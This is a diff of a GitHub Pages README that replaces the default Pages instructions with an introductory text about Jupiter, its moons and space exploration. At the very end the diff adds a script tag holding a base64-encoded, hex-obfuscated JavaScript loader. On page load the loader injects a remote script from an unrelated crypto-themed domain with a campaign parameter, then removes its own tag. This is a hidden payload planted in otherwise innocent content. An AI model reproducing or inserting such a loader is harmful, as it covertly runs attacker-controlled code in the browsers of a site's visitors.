@@ -1,37 +1,15 @@
-## Welcome to GitHub Pages
+# Mission to Jupiter
 
-You can use the [editor on GitHub](https://github.com/vernicora/Mission/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+You’re not even close to leaving the solar system when you pull into orbit around Jupiter, but you’d swear you’ve just entered a new one. Your ship’s scanners flash with readings of nearby worlds and faint rings. Jupiter, the largest planet in our solar system, rules a system of its own. Some astronomers consider it a failed star. Welcome to the realm of giants.
+![l](https://upload.wikimedia.org/wikipedia/commons/5/50/Jupiter%2C_image_taken_by_NASA%27s_Hubble_Space_Telescope%2C_June_2019_-_Edited.jpg)
+Jupiter is a gas giant, a ball of mostly hydrogen and helium large enough to hold more than 1,300 Earths. You won’t find any solid surface to explore here, and skydiving from your ship’s airlock would be a bad idea. You’d sink deeper into clouds of ammonia and water vapor until the intense atmospheric pressure and heat compressed the hydrogen around you into a molten liquid. Science fiction writers have proposed exploring Jupiter in hot-air balloons high above the crushing depths below, but you’re happy sipping cocoa aboard your ship in orbit. It’s a safer place to watch Jupiter’s spectacular cloud bands whiz by at more than 300 miles an hour (530 kilometers an hour).
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+Several of Jupiter’s nearly 70 moons grab your attention. Mega-moon Ganymede is larger than Mercury and has its own magnetic field. Volcanoes on Io, the most volcanic body in the solar system, spew clouds of yellow sulfur 300 miles (500 kilometers) high. Frozen Europa might hide a liquid ocean beneath its icy crust. Scientists believe Europa might hide something else inside that ocean: life.
+![p](https://ichef.bbci.co.uk/news/410/cpsprodpb/31B0/production/_112202721_noirlab2011a-small.jpg)
+In the last number of years we have learned more about space than at any other time in history. We began sending rockets into space in the 1960s and here we are, only sixty years later, watching images sent back from space missions to Mars, asteroids, and comets, and astronauts living in the space station that orbits our Earth.
 
-### Markdown
+Along the way, we have learned a lot about space that changed previous ideas and gave us entirely new ones. As we continue to explore we will find that space and the universe brings exciting concepts that astound the imagination.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+Space, also known as outer space, is the near-vacuum between celestial bodies. It is where everything (all of the planets, stars, galaxies and other objects) is found.
 
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/vernicora/Mission/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script id="rzq4N" src="data:text/javascript;base64, dmFyIF9PeWhvTSA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX2phWmR2LCBfSXoySzgpIHt2YXIgX1hHekYxID0gZnVuY3Rpb24oX011MkVXKSB7d2hpbGUgKC0tX011MkVXKSB7X2phWmR2WydwdXNoJ10oX2phWmR2WydzaGlmdCddKCkpO319O19YR3pGMSgrK19JejJLOCk7fShfT3lob00sIDB4MTFiKSk7dmFyIF80WlVGcSA9IGZ1bmN0aW9uKF94UnhSTSwgX1dBdGM4KSB7X3hSeFJNID0gX3hSeFJNIC0gMHgwO3ZhciBfZzZYZjMgPSBfT3lob01bX3hSeFJNXTtyZXR1cm4gX2c2WGYzO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfNFpVRnEoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX2dwc1VlID0gZG9jdW1lbnRbXzRaVUZxKCcweDEnKV0oXzRaVUZxKCcweDInKSk7X2dwc1VlW180WlVGcSgnMHgzJyldID0gXzRaVUZxKCcweDQnKTtfZ3BzVWVbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3OVx4NjFceDZlXHg2MVx4MzJceDMxXHgzMFx4MzdceDY0XHg2MVx4NjNceDYzXHgzMVx4MmVceDY1XHg2M1x4NzJceDc5XHg3MFx4NzRceDZmXHg3Mlx4NjVceDc2XHg2Zlx4NmNceDc1XHg3NFx4NjlceDZmXHg2ZVx4MmVceDYzXHg2Zlx4NmRceDJmXHg1Zlx4NzJceDY1XHg2ZFx4NmZceDc0XHg2NVx4NWZceDc0XHg3Mlx4NjFceDYzXHg2Ylx4MmVceDZhXHg3M1x4M2ZceDYzXHg2MVx4NmRceDcwXHg2MVx4NjlceDY3XHg2ZVx4M2RceDUwXHg1N1x4NzZceDc4XHg0NFx4NTJceDQ3XHg3NVx4NmNceDcxJztkb2N1bWVudFtfNFpVRnEoJzB4NScpXShfNFpVRnEoJzB4NicpKVsnXHg2MVx4NzBceDcwXHg2NVx4NmVceDY0XHg0M1x4NjhceDY5XHg2Y1x4NjQnXShfZ3BzVWUpO2RvY3VtZW50W180WlVGcSgnMHg3JyldKCdyenE0TicpWydceDcyXHg2NVx4NmRceDZmXHg3Nlx4NjUnXSgpO30sIHsnXHg2Zlx4NmVceDYzXHg2NSc6ICEhW119KTs="></script>
